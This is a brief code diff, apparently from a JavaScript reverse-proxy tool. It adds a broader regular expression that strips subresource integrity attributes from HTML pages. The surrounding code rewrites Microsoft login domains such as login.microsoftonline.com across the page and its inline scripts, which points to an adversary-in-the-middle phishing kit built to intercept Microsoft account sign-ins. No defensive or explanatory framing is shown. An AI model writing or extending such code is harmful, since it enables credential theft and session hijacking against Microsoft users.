@@ -703,6 +703,7 @@ const caption =
         html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
         html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
         html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
+        html = html.replace(/\s+integrity\s*=\s*["'][^"']*["']/gi, '');
 
         // ---- STEP 2: Rewrite all Microsoft domains in the entire HTML (inline scripts + attributes) ----
         const domains = ['login.microsoftonline.com', 'microsoftonline.com', 'login.windows.net', 'login.microsoft.com', 'sts.microsoftonline.com'];
